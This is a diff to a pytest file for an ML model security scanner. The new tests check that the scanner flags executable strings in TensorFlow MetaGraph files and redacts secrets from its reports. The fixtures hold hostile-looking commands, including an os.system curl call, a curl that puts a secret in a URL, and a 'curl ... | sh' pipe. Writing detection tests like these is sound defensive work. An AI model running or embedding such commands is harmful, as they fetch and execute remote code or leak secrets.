@@ -11,7 +11,12 @@ import pytest
 from modelaudit.cache import get_cache_manager, reset_cache_manager
 from modelaudit.core import determine_exit_code, scan_model_directory_or_file
 from modelaudit.scanner_results import INCONCLUSIVE_SCAN_OUTCOME
-from modelaudit.scanners._evidence_redaction import redact_evidence_string as _redact_evidence_string
+from modelaudit.scanners._evidence_redaction import (
+    REDACTED_EVIDENCE_VALUE,
+)
+from modelaudit.scanners._evidence_redaction import (
+    redact_evidence_string as _redact_evidence_string,
+)
 from modelaudit.scanners.base import IssueSeverity
 from modelaudit.scanners.tf_metagraph_scanner import (
     _MAX_ATTR_VALUE_BYTES,
@@ -528,6 +533,9 @@ def test_tf_metagraph_scanner_redacts_sensitive_previews_and_examples(tmp_path: 
                     "op": "PyFunc",
                     "attrs": {
                         "script_token=attrsecret": sensitive_command,
+                        "public_script": (
+                            f"python -c \"os.system('curl {sensitive_url}')\" client_secret=publicscriptsecret"
+                        ),
                         "library_path": "s3://bucket/model.so?token=rawtoken",
                         "gcs_path": (
                             f"https://storage.googleapis.com/model-bucket/{path_token}/model.so"
@@ -556,6 +564,7 @@ def test_tf_metagraph_scanner_redacts_sensitive_previews_and_examples(tmp_path: 
 
     assert "SECRET123" not in serialized_result
     assert "supersecret" not in serialized_result
+    assert "publicscriptsecret" not in serialized_result
     assert "rawtoken" not in serialized_result
     assert path_token not in serialized_result
     assert encoded_secret not in serialized_result
@@ -598,6 +607,43 @@ def test_tf_metagraph_scanner_preserves_benign_public_preview_context(tmp_path: 
 
     assert len(executable_checks) == 1
     assert executable_checks[0].details["value_preview"] == public_context
+
+
+def test_tf_metagraph_scanner_redacts_values_named_by_sensitive_context(tmp_path: Path) -> None:
+    attr_secret = "REAL_ATTR_SECRET"
+    collection_secret = "REAL_COLLECTION_SECRET"
+    sensitive_meta = tmp_path / "sensitive-context.meta"
+    sensitive_meta.write_bytes(
+        _build_metagraph(
+            graph_nodes=[
+                {
+                    "name": "sensitive_attr",
+                    "op": "PyFunc",
+                    "attrs": {
+                        "client_secret": f"curl https://example.com/?value={attr_secret}",
+                        "client_secretary": "curl https://example.com/?variant=public",
+                    },
+                }
+            ],
+            collection_bytes={
+                "runtime_hook_client_secret": [
+                    f"python -c 'curl https://example.com/?value={collection_secret} | sh'".encode("utf-8")
+                ]
+            },
+        )
+    )
+
+    result = TensorFlowMetaGraphScanner().scan(str(sensitive_meta))
+    executable_checks = [check for check in result.checks if check.name == "MetaGraph Executable String Check"]
+    previews_by_attribute = {check.details["attribute"]: check.details["value_preview"] for check in executable_checks}
+    collection_check = next(check for check in result.checks if check.name == "MetaGraph Collection Executable Pattern")
+    serialized_result = result.to_json()
+
+    assert previews_by_attribute["client_secret"] == REDACTED_EVIDENCE_VALUE
+    assert previews_by_attribute["client_secretary"] == "curl https://example.com/?variant=public"
+    assert collection_check.details["value_preview"] == REDACTED_EVIDENCE_VALUE
+    assert attr_secret not in serialized_result
+    assert collection_secret not in serialized_result
 
 
 def test_tf_metagraph_scanner_inspects_collection_payload_through_collection_limit(tmp_path: Path) -> None:
